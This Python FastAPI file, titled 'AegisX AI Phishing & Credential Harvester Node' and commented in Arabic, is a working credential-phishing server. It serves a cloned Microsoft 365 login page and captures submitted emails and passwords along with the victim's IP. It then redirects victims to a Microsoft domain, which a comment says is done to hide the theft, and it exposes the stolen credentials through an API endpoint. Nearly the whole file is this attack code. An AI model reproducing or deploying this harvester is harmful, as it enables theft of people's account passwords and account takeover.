import os
import requests
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from pydantic import BaseModel

app = FastAPI(title="AegisX AI Phishing & Credential Harvester Node")

# قاعدة بيانات وهمية في الذاكرة لتسجيل الضحايا والبيانات المستهدفة
HARVESTED_CREDENTIALS = []

# قوالب صفحات الهبوط المستهدفة (Microsoft 365 كمثال محاكاة)
MICROSOFT_TEMPLATE = """
<html>
<head>
    <title>Sign in to your Microsoft account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; width: 360px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #dedede; }
        .logo { color: #737373; font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #737373; box-sizing: border-box; }
        input[type="submit"] { background-color: #0067b8; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: 600; }
        input[type="submit"]:hover { background-color: #005da6; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">Microsoft</div>
        <h2>Sign in</h2>
        <form action="/harvest" method="post">
            <input type="email" name="username" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Next">
        </form>
    </div>
</body>
</html>
"""

@app.get("/clone", response_class=HTMLResponse)
async def serve_phish_page(template: str = "microsoft"):
    if template == "microsoft":
        return HTMLResponse(content=MICROSOFT_TEMPLATE, status_code=200)
    else:
        raise HTTPException(status_code=404, detail="Template vector not found.")

@app.post("/harvest")
async def harvest_credentials(username: str = Form(...), password: str = Form(...), request: Request = None):
    client_ip = request.client.host if request else "0.0.0.0"
    
    log_entry = {
        "target_user": username,
        "captured_password": password,
        "source_ip": client_ip,
        "vector": "Microsoft_365_Portal"
    }
    
    HARVESTED_CREDENTIALS.append(log_entry)
    print(f"[!] TARGET HARVESTED: {log_entry}")
    
    # تحويل الضحية تلقائياً إلى الصفحة الحقيقية بعد سرقة البيانات للتمويه ومنع الشك
    return RedirectResponse(url="https://microsoftonline.com", status_code=303)

@app.get("/api/v1/results")
async def get_harvested_data():
    return {"status": "SUCCESS", "count": len(HARVESTED_CREDENTIALS), "data": HARVESTED_CREDENTIALS}

